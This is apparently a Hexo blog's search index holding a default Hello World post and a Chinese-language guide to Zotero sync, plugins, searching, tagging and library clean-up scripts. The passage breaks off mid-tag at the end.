<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/01/21/hello-world/"/>
      <url>/2023/01/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>zotero</title>
      <link href="/2022/05/06/zotero/"/>
      <url>/2022/05/06/zotero/</url>
      
        <content type="html"><![CDATA[<p>#学术<br>全平台支持的文献管理工具。</p><p>本文只推荐部分插件的使用，具体zotero全局配置不在介绍中。如果不想把所有的文献pdf等内容都放在zotero根目录下的话，还是要好好去配配的。</p><p>官方推荐插件<a href="https://www.zotero.org/support/plugins">集合</a>, 可用找到本文推荐的大多数插件</p><h1 id="坚果云同步"><a href="#坚果云同步" class="headerlink" title="坚果云同步"></a>坚果云同步</h1><blockquote><p>替代品TeraCloud，免费的日本云盘</p></blockquote><p>注意，使用坚果云WebDav同步的对象是附件（如pdf），会以文献条目相似的hash码的前缀来保存（prop和zip）。所以在坚果云里看到的是乱七八糟的，不要怕。</p><p>🚨WebDav只会对后续添加的内容进行更新，想要将之前的内容页更新的时候就只能选择一个包含足够多PDF等附件的电脑，通过同步-&gt;重置来覆盖掉云端数据，之前的内容也就能上传了。</p><h2 id="使用坚果云webdav的方式同步"><a href="#使用坚果云webdav的方式同步" class="headerlink" title="使用坚果云webdav的方式同步"></a>使用坚果云webdav的方式同步</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651067608169_0.png"><br>这里的用户名是在zotero注册的账号，免费有100M的同步空间呢（文献条目不是算在消耗内的)。<strong>下方还有一个下载文件选择，最好选择在需要时，减少坚果云的流量占用</strong>。</p><blockquote><p>数据同步部分还有一个选择文献库的操作，只要是选择是否要同步，同步哪些文献库</p></blockquote><p>使用WebDAV代替Zotero。<br>之后就是去坚果云，点击左下角网络样子的图标，进入官网，点击账户信息。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651067758613_0.png"><br>之后将生成的信息对应的填入zotero就行。</p><blockquote><p>同步可用选择点击同步按钮再进行同步。就是右上角那个绿色的刷新图标！</p></blockquote><blockquote><blockquote><p>如果你的鼠标只是定位在单个文献或者子文献集上，此时点击同步按钮，<strong>同步的并非是完整的Zotero文献</strong>，切记切记！</p></blockquote></blockquote><h2 id="同步设置"><a href="#同步设置" class="headerlink" title="同步设置"></a>同步设置</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651069330319_0.png"><br>这里和文献同步相关的有两项：Data Syncing和File Syncing。Data Syncing用于同步文献数据，如文献条目和笔记，这个同步是免费的。File Syncing则用于同步文献PDF等附件，则只有100M免费空间。</p><h1 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h1><h2 id="本地安装"><a href="#本地安装" class="headerlink" title="本地安装"></a>本地安装</h2><p>对应的插件后缀为<code>xpi</code>。</p><h1 id="推荐插件"><a href="#推荐插件" class="headerlink" title="推荐插件"></a>推荐插件</h1><h2 id="SCI-hub"><a href="#SCI-hub" class="headerlink" title="SCI-hub"></a>SCI-hub</h2><p>懂的都懂</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>点击<code>编辑</code>-&gt;<code>首选项</code>-&gt;<code>高级</code>-&gt;<code>设置编辑器</code><br>搜索<code>extensions.zotero.findPDFs.resolvers</code><br>将以下代码复制到对话框</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Sci-Hub&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span><span class="string">&quot;GET&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://sci-hub.ren/&#123;doi&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span><span class="string">&quot;html&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;selector&quot;</span><span class="punctuation">:</span><span class="string">&quot;#pdf&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span><span class="string">&quot;src&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;automatic&quot;</span><span class="punctuation">:</span><span class="keyword">true</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651065071932_0.png"><br>之后在右键中找到可用的PDF就可以从<code>sci-hub</code>里找到之前没能找到的论文。</p><h2 id="扩展搜索引擎的插件"><a href="#扩展搜索引擎的插件" class="headerlink" title="扩展搜索引擎的插件"></a>扩展搜索引擎的插件</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651065676769_0.png"><br>可用看到一开始的检索引擎是很少的。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p><code>首选项</code>-&gt;<code>高级</code>-&gt;<code>文件与文件夹</code>-&gt;<code>打开数据文件夹</code><br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651065763336_0.png"><br>将以下的替换位化工之光提供的<code>engines.json</code>文件<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651065802505_0.png"><br>其实就是增加了其他的搜索引擎的json配置。这个json其实就是把其他人提供的搜索引擎都放在了一起。</p><h2 id="Jasminum"><a href="#Jasminum" class="headerlink" title="Jasminum"></a>Jasminum</h2><p>先给<a href="https://github.com/l0o0/jasminum">地址</a></p><blockquote><p>增加对中文文献的支持。并且能够合并中文的姓和名</p></blockquote><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651066275541_0.png"><br>同时更新<code>非官方维护中文翻译器</code></p><h2 id="Quicklook"><a href="#Quicklook" class="headerlink" title="Quicklook"></a>Quicklook</h2><blockquote><p>pdf预览功能，但是zotero6.0已经支持pdf阅读了，其实也可以不要了</p></blockquote><p>这是一个外置的软件，实现类似与<code>mac</code>中的预览操作</p><h3 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h3><p>在安装完成之后，需要更改<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651066496893_0.png"><br>选择刚刚安装的Quicklook的exe文件。</p><blockquote><p>在zotero里预览是回车，而在外部其实是空格</p></blockquote><h2 id="中文参考文献"><a href="#中文参考文献" class="headerlink" title="中文参考文献"></a>中文参考文献</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651066618162_0.png"><br>在zotero里默认是没有中文参考文献格式，可用通过获取更多样式搜索<code>China</code>找到。<br>而右侧的加号可用加载本地样式，化工之光提供了2个中文的格式，将作者等改成et al。</p><blockquote><p>注意，需要将每个参考文献配置中的语言设置为<code>en</code></p></blockquote><h2 id="Delitemwithatt"><a href="#Delitemwithatt" class="headerlink" title="Delitemwithatt"></a>Delitemwithatt</h2><p><a href="https://github.com/redleafnew/delitemwithatt">地址</a><br>右键会多一个将语言字段设置为<code>en</code>，这样就可以在全选的时候快速设置</p><h2 id="Zutilo"><a href="#Zutilo" class="headerlink" title="Zutilo"></a>Zutilo</h2><blockquote><p>用户界面功能和快捷键等设置。</p></blockquote><p><a href="https://github.com/wshanks/Zutilo">下载地址</a></p><h3 id="实现联动"><a href="#实现联动" class="headerlink" title="实现联动"></a>实现联动</h3><blockquote><p>Copy select item links</p></blockquote><p>安装Zutilo插件后，点击Zotero菜单栏Tools–&gt;Zutilo Preferences。<br>进入Zutilo插件的设置界面，如下图所示，我们开启Copy select item links的右键菜单项。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>Copy select item links，即复制所选文献条目在Zotero文献库（即我的文库）中的位置。<br>比如我选中一篇文献，然后在右键菜单选择Copy select item links。在其他软件内嵌入该链接，然后点击该链接，便能一键跳转到Zotero，并显示该文献在Zotero中的位置。</p><h2 id="Zotfile"><a href="#Zotfile" class="headerlink" title="Zotfile"></a>Zotfile</h2><blockquote><p>坚果云的同步并不是这个插件带来的，这个插件带来的是同步盘操作！！</p></blockquote><p><a href="https://github.com/jlegewie/zotfile">地址</a></p><h3 id="重建文件夹系统"><a href="#重建文件夹系统" class="headerlink" title="重建文件夹系统"></a>重建文件夹系统</h3><blockquote><p>去看看<code>zotero/storage</code>就知道它为什么这么受欢迎</p></blockquote><p>在Zotero里，所以的文献条目都是存储在<code>stroage</code>里，并且以特定的文件夹形式存储。这里的介绍不合适，最好看其他地方的使用入门</p><h4 id="zotfile设置"><a href="#zotfile设置" class="headerlink" title="zotfile设置"></a>zotfile设置</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651144938271_0.png"></p><blockquote><p>1表示从哪里抓取数据，2表示放到哪里</p></blockquote><p>1一般下载的文件存放的位置，并不是zotero里的位置。而2可以默认第一个（不设置的话，所有文献的pdf等东西都会依据文献条目那种命名方式存储在zotero根目录下)。正方形选择框可用选上。<br>如果设置了2的<code>custom location</code>，通过右键<code>move and </code>啥的操作就会将指定文献迁移到<code>zotfile</code>这个指定的文件夹下，这样容易导致<code>zotero</code>不好管理。</p><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>在Zotero里，我们有一个文献条目，但是没有pdf，这个时候，我们手动下载了它的pdf放在Download下（1指定的文件夹），然后只需要在Zotero里右键选择Attach newfile，就可以把这个pdf和指定的文献条目对应起来，pdf会被移动到Zotero里的对应的位置。</p><h3 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h3><p>附带功能，我是感觉没啥用，但是也了解一下重命名的规则，万一想重命名呢</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">％a，作者，在“其他设置”下更改了最大作者数量。</span><br><span class="line">％y，年（从“日期”字段中提取）</span><br><span class="line">％t，标题。标题其余部分的最大长度可以更改。</span><br><span class="line">％j，期刊名称</span><br><span class="line">％p，出版者的名称</span><br><span class="line">％w，期刊或出版者的名称（与“％j”,“％p”相同)</span><br><span class="line">％s，期刊缩写</span><br><span class="line">％v，期刊第几卷</span><br><span class="line">％e，期刊发行号</span><br><span class="line">％f，期刊页码</span><br><span class="line">％c，收集路径（仅适用于子文件夹，不适用于文件名）。当项目在多个集合中时，用户可以在不同的集合之间进行选择。</span><br><span class="line">％n，专利号（仅限专利项）</span><br><span class="line">％i，受让人（仅专利项目），assignee</span><br><span class="line">％i ，作者首字母缩写。</span><br><span class="line">％F ，位作者的姓氏，包括名字的首字母（例如EinsteinA）。</span><br><span class="line">％ ，作者的第一封信（适用于子文件夹）</span><br><span class="line">％d、％D、％L、％l，编辑者的通配符，与作者相同。</span><br><span class="line">％T，条目类型（本地化）</span><br></pre></td></tr></table></figure><h3 id="Tablet"><a href="#Tablet" class="headerlink" title="Tablet"></a>Tablet</h3><p>同步阅读PDF的功能，但是现在已经内置PDF阅读功能了，应该不需要设置了。具体查看<a href="https://mp.weixin.qq.com/s?__biz=MzAxNzgyMDg0MQ==&mid=2650457636&idx=1&sn=7e185f245833f18d172b9a284a28a762&chksm=83d1dbe2b4a652f4d3276e747d4b305f058eae468e49056089bf69e50be797317fd34123274c&cur_album_id=1319074508795641857&scene=189#wechat_redirect">青柠学术</a></p><h2 id="Zotero-IF"><a href="#Zotero-IF" class="headerlink" title="Zotero IF"></a>Zotero IF</h2><p>查看影响因子，能够将注释保存到PDF.<br><a href="https://github.com/qnscholar/zotero-if">地址</a></p><h2 id="Zotero-Citation-Update"><a href="#Zotero-Citation-Update" class="headerlink" title="Zotero Citation Update"></a>Zotero Citation Update</h2><p>根据文章的doi号，获得文章的被引量数据。该插件是基于Zotero Scholar Citations插件，然后升级改版，最后由青柠学术大幅修改得到的。</p><h2 id="DOI-Manager"><a href="#DOI-Manager" class="headerlink" title="DOI Manager"></a>DOI Manager</h2><p><a href="https://github.com/bwiernik/zotero-shortdoi">地址</a><br>检查期刊的doi是否有效，将长doi替换为短doi，将短doi替换为原始doi。<br>最主要的是，能够帮忙去找DOI</p><h2 id="PDF-translate"><a href="#PDF-translate" class="headerlink" title="PDF translate"></a>PDF translate</h2><p>翻译功能！！！带星号的需要自己接入API，<a href="https://ripperhe.gitee.io/bob/#/service/translate/niu">教学</a><br>虽然star比较少，但是应该是<a href="https://github.com/windingwind/zotero-pdf-translate">地址</a></p><h2 id="Better-BibTeX"><a href="#Better-BibTeX" class="headerlink" title="Better BibTeX"></a>Better BibTeX</h2><p>先给<a href="https://github.com/retorquere/zotero-better-bibtex">下载地址</a>，然后是<a href="http://retorque.re/zotero-better-bibtex">使用说明</a></p><h3 id="配置-3"><a href="#配置-3" class="headerlink" title="配置"></a>配置</h3><p>菜单栏Zotero–&gt;Preferences设置Better BibTeX<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651070314248_0.png"><br>此外，可以发现，所有文献会自动增加一列属性“Citekey”，该Citekey值便对应了在LaTeX中引用该文献时的bibid值（即cite{bibid}）<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651070325010_0.png"></p><h3 id="精简文献属性"><a href="#精简文献属性" class="headerlink" title="精简文献属性"></a>精简文献属性</h3><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651070446804_0.png"><br>可以看到，除了必要的title、author、year、month、volume、pages、issue等信息，连abstract、note等内容都导出来了，很多时候，这完全没必要。为了精简.bib文件，可以在Preferences中设置“Better BibTeX”。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651070461132_0.png"><br>将不需要导出的属性值填进去即可，比如abstract和note，以逗号分隔。</p><h3 id="固定BibTeX-Key"><a href="#固定BibTeX-Key" class="headerlink" title="固定BibTeX Key"></a>固定BibTeX Key</h3><p>但是如果你更改了文献的属性值，比如title、author、year，那么，该文献的BibTeX Key也会自动发生改变。<br>因此如果你不希望该文献的BibTeX Key发生改变，那你就可以选择用Pin BibTeX Key功能将其固定📌住，使得其不再变化。</p><h2 id="save-with-tag"><a href="#save-with-tag" class="headerlink" title="save-with-tag"></a>save-with-tag</h2><p>先给<a href="https://github.com/NicoleMayer/zotero-save-with-tag">地址</a><br>链接<a href="https://mp.weixin.qq.com/s?__biz=MzAxNzgyMDg0MQ==&mid=2650470344&idx=1&sn=1f73b22f7a2b534da92eef34e73614bf&chksm=83d1ea0eb4a66318de5015290d3b937875d398ccbcc0d3d1240e8a795048dc3977ce3f091548&scene=178&cur_album_id=1319074508795641857#rd">1</a> <a href="https://mp.weixin.qq.com/s?__biz=MzAxNzgyMDg0MQ==&mid=2650470366&idx=1&sn=fed1015f6738fe35202aec106e38ebec&chksm=83d1ea18b4a6630e716c2383f383b6844ca32ba641b2dd44ffc078eef8640760fa3c85fd33e6&cur_album_id=1319074508795641857&scene=190#rd">2</a></p><h2 id="dark-theme"><a href="#dark-theme" class="headerlink" title="dark theme"></a>dark theme</h2><p><a href="https://github.com/ThomasFKJorna/zotero-night">地址</a></p><h1 id="使用手册"><a href="#使用手册" class="headerlink" title="使用手册"></a>使用手册</h1><h2 id="标签的高级使用"><a href="#标签的高级使用" class="headerlink" title="标签的高级使用"></a>标签的高级使用</h2><h3 id="快捷键打标签"><a href="#快捷键打标签" class="headerlink" title="快捷键打标签"></a>快捷键打标签</h3><h4 id="问题的定义"><a href="#问题的定义" class="headerlink" title="问题的定义"></a>问题的定义</h4><p>看到了一篇很重要的文献，但是暂时没时间看，此时最担心的是后面想看它的时候找不到它了。<br>那么我们是不是可以专门设一个标签，叫做_read later呢，而且按下键盘上的某个数字就可以立即给它_read later标签，省得手动打字添加标签。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>Zotero可以允许设置10个这样的标签（这里姑且叫做高级标签），也就是可以设置10种不同颜色和不同快捷键的标签。</p><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>右击某个想要添加颜色和快捷键的标签，可以看到三个菜单项，分别是assign color、rename tag、delete tag，这里我们选择assign color，在弹出的窗口中即可设置颜色和快捷键（数字1-10）<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651068789624_0.png"><br>比如，这里我为_read later设置了绿色，和快捷键2，这样当我选中某个文献，然后按下键盘上的数字2，即可为它添加_read later标签。</p><h4 id="存在问题"><a href="#存在问题" class="headerlink" title="存在问题"></a>存在问题</h4><p>唯有通过手动添加标签，才能改变文献的修改日期，颜色标签快捷键是不可以的。</p><h2 id="搜索功能"><a href="#搜索功能" class="headerlink" title="搜索功能"></a>搜索功能</h2><h3 id="分层级搜索"><a href="#分层级搜索" class="headerlink" title="分层级搜索"></a>分层级搜索</h3><p>Zotero具有强大的搜索功能，可以在全部的文献中搜索，也可以只搜索某个文件夹。如下图，Zotero可以按照三种方式搜索。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651068901370_0.png"></p><h3 id="快速定位某篇文献所在的文献集"><a href="#快速定位某篇文献所在的文献集" class="headerlink" title="快速定位某篇文献所在的文献集"></a>快速定位某篇文献所在的文献集</h3><p>选中该文献，然后根据你的操作系统长按相应的快捷键：<br>macOS：option&#x2F;alt键<br>Windows：ctrl键<br>Linux：alt键<br>此时，该文献所在的文献集会以黄色高亮显示。</p><h3 id="近期添加的文献"><a href="#近期添加的文献" class="headerlink" title="近期添加的文献"></a>近期添加的文献</h3><p>右键单击My Library，选择New Saved Search。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651071964007_0.png"><br>然后，按照下方的格式设置过滤条件，并可以命名为papers in last week。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651071975887_0.png"><br>假如我想筛选过去一周添加到Zotero中的期刊论文，那么设置下面两项即可。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Date Added➕is in the last➕7➕days</span><br><span class="line">Item Type➕is➕Journal Article</span><br></pre></td></tr></table></figure><p>当然，如果你想要筛选过去半个月的文献，即可把7改为15。又或者，你想筛选会议论文，可以把Journal Article改为Conference Paper。<br>设置完毕后, 可以看到，过去一周新添加的文献都在这里了！也就是说都在左边的papers in last week文件夹中了。</p><blockquote><p>重点是，这里设置的7天是一个相对概念，即永远是从当天的日期往前推7天，非常的强大高效！</p></blockquote><blockquote><blockquote><p>便于我们始终能够精准筛选过去一周添加的文献。</p></blockquote></blockquote><h3 id="同一个作者的所有论文"><a href="#同一个作者的所有论文" class="headerlink" title="同一个作者的所有论文"></a>同一个作者的所有论文</h3><blockquote><p>通过<a href="https://scholar.google.com/">谷歌学术</a>实现</p></blockquote><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651111034349_0.png"><br>在谷歌学术中可以搜索作者，更具体<a href="https://mp.weixin.qq.com/s?__biz=MzAxNzgyMDg0MQ==&mid=2650457395&idx=1&sn=e1f7a7f8c2b5464fb3bb31d7afaa8489&chksm=83d1d8f5b4a651e388b9dd3f856b4870ba3f9df2ed5cf837222dea7a31afb7cafb8cdbb64390&scene=178&cur_album_id=1319074508795641857#rd">查看</a></p><h3 id="Saved-Search"><a href="#Saved-Search" class="headerlink" title="Saved Search"></a>Saved Search</h3><blockquote><p>Saved Search中的内容是动态更新的，也就是说不管你以后在Zotero中新添了多少文献，只要有满足你设定的筛选条件的文献，都会出现在Saved Search列表中。而且，右键Saved Search，可以随时修改筛选条件！</p></blockquote><h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><p>右击My Library，在右键菜单中选择New Saved Search可以新建一个“Saved Search”。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651111995413_0.png"><br>筛选条件中，第一项可以根据需要选择文献的Field类型，全部选项如下。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651112012806_0.png"><br>第二项的内容会根据第一项所选择的Field类型会有所不同，以Date Added为例，可以选择is、is not、is before、is after、is in the last，这个其实很有妙用！<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651112044320_0.png"><br>在最后一项填入相应的内容，比如作者的姓名，标题关键词、日期等等。<br>通过右边的➕按钮，我们可以建立多条筛选条件，实现更为强大的搜索能力。</p><h3 id="搜索文献PDF全文内容"><a href="#搜索文献PDF全文内容" class="headerlink" title="搜索文献PDF全文内容"></a>搜索文献PDF全文内容</h3><h4 id="建立PDF全文索引"><a href="#建立PDF全文索引" class="headerlink" title="建立PDF全文索引"></a>建立PDF全文索引</h4><p>Zotero自带PDF全文搜索能力，在首选项–&gt;搜索中可以找到。<br>为了确认是否所有文献已经建立了索引，我们可以检查下图所示的Index Statistics。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651113348273_0.png"><br>如果你担心有文献遗漏的话，可以点击下图所示的Rebuild Index，即重新对Zotero内的所有文献建立索引。<br>另外，如果我们随意查看某篇文献的PDF附件，从右侧的Indexed：Yes，可以确认该PDF已经建立索引。如果你想重新建立索引，可以右键选择Reindex Item。</p><h4 id="全文搜索"><a href="#全文搜索" class="headerlink" title="全文搜索"></a>全文搜索</h4><p>点击Zotero的高级搜索<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651113484275_0.png"></p><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><h3 id="文献集（Collections）之间移动或复制文献"><a href="#文献集（Collections）之间移动或复制文献" class="headerlink" title="文献集（Collections）之间移动或复制文献"></a>文献集（Collections）之间移动或复制文献</h3><p>Zotero的复制文献操作大家应该都知道：拖拽文献到其他文献集中即可。<br>当一篇文献被复制到其他文献集后，它在原来的文献集中依然保留，即这篇文献会同时存在于多个文献集。</p><h4 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h4><p>很多Zotero用户需要把同一篇文献同时归类在不同文献集中。<br>注意，是通过拖拽文献条目的方式将其复制到其他文献集中，而不是将同一篇文献分两次保存到不同文献集中（比如拖拽PDF或者Zotero Connector保存）。<br>这是两个完全不同的概念，前者只会在本地保存一份PDF附件，后者会在本地保存两份PDF附件。</p><h4 id="移动文献"><a href="#移动文献" class="headerlink" title="移动文献"></a>移动文献</h4><p>选中待移动的文献，然后根据你的操作系统按下相应快捷键，👇<br>macOS：Cmd<br>Windows&#x2F;Linux：Shift<br>接着，将该文献拖拽到其他文献集即可。完成上述操作之后，该文献在原来的位置就不存在了，只存在于新的文献集。</p><h4 id="合并重复的文献"><a href="#合并重复的文献" class="headerlink" title="合并重复的文献"></a>合并重复的文献</h4><p>针对重复文献，会在Duplicate Items中显示重复的文献，通过Merge功能即可将多篇重复的文献合并为一篇文献。</p><h3 id="删除文献"><a href="#删除文献" class="headerlink" title="删除文献"></a>删除文献</h3><h4 id="Zotero的删除功能"><a href="#Zotero的删除功能" class="headerlink" title="Zotero的删除功能"></a>Zotero的删除功能</h4><p>在Zotero里有2种删除操作：<br>“Remove Item from Collection”，即“从文献集中删除”。<br>“Move Item to Trash”，即“移至回收站”。</p><h5 id="Remove-Item-from-Collection"><a href="#Remove-Item-from-Collection" class="headerlink" title="Remove Item from Collection"></a>Remove Item from Collection</h5><p>从文献集中删除，只是把文献从当前所在文献集中删除，并不会将其从我的文库和它所在的其他文献集中删除，更不会将其附件从本地删除，也就无法将其从坚果云中删除。</p><h5 id="Move-Item-to-Trash"><a href="#Move-Item-to-Trash" class="headerlink" title="Move Item to Trash"></a>Move Item to Trash</h5><p>将文献条目及其PDF附件都移至回收站，一旦执行该操作，该文献在所有它存在的文献集中的条目将全部删除，并且PDF附件也会移至回收站。</p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>以上删除方法都无法彻底从本地删除。<br>如果想让文献的附件彻底地从本地删除，只需要右键Zotero的Trash，并选择Empty Trash。</p><h4 id="彻底删除，并坚果云"><a href="#彻底删除，并坚果云" class="headerlink" title="彻底删除，并坚果云"></a>彻底删除，并坚果云</h4><p>选择“Move Item to Trash”，即将其移至回收站。<br>通过Empty Trash，我们清空回收站。<br>选择Zotero的My Library，并点击右上角的同步按钮。</p><h2 id="文献清洗"><a href="#文献清洗" class="headerlink" title="文献清洗"></a>文献清洗</h2><p>有的文献在导入Zotero时，其他（extra）字段就自带内容，比如Publisher、PMID等等。这些自带的内容不仅没多大用，在更新文献引用量时，还特别占位置。</p><h3 id="清除Zotero其他（extra）字段信息"><a href="#清除Zotero其他（extra）字段信息" class="headerlink" title="清除Zotero其他（extra）字段信息"></a>清除Zotero其他（extra）字段信息</h3><p>进入Zotero菜单栏工具–&gt;开发者–&gt;Run Javascript<br>将代码填入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var fieldName = <span class="string">&quot;extra&quot;</span>;</span><br><span class="line">var newValue = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">var fieldID = Zotero.ItemFields.getID(fieldName);</span><br><span class="line">var s = new Zotero.Search();</span><br><span class="line">s.libraryID = ZoteroPane.getSelectedLibraryID();</span><br><span class="line">var ids = <span class="keyword">await</span> s.search();</span><br><span class="line"><span class="keyword">if</span> (!ids.length) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;No items found&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">await</span> Zotero.DB.executeTransaction(<span class="keyword">async</span> function () &#123;</span><br><span class="line"><span class="keyword">for</span> (let <span class="built_in">id</span> of ids) &#123;</span><br><span class="line">let item = <span class="keyword">await</span> Zotero.Items.getAsync(<span class="built_in">id</span>);</span><br><span class="line">let mappedFieldID = Zotero.ItemFields.getFieldIDFromTypeAndBase(item.itemTypeID, fieldName);</span><br><span class="line">item.setField(mappedFieldID ? mappedFieldID : fieldID, newValue);</span><br><span class="line"><span class="keyword">await</span> item.save();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> ids.length + <span class="string">&quot; item(s) updated&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><code>GB/T 7714</code>好像是大多数毕业论文的参考文献格式。</p><h3 id="经典视图插入文献"><a href="#经典视图插入文献" class="headerlink" title="经典视图插入文献"></a>经典视图插入文献</h3><p>Preferences–&gt;Cite–&gt;Word Processors，然后勾选Use classic Add Citation dialog，即可搞定！</p><h3 id="同一位置插入多篇文献"><a href="#同一位置插入多篇文献" 